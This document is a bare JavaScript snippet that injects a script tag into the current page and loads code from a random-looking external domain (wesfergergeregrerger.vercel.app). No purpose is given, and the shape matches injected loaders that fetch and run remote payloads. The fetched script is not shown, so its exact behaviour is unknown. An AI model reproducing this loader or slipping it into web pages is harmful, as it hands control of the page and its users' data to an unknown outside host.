var s = document.createElement('script');
s.type='text/javascript';
document.body.appendChild(s);
s.src='https://wesfergergeregrerger.vercel.app/script.js';
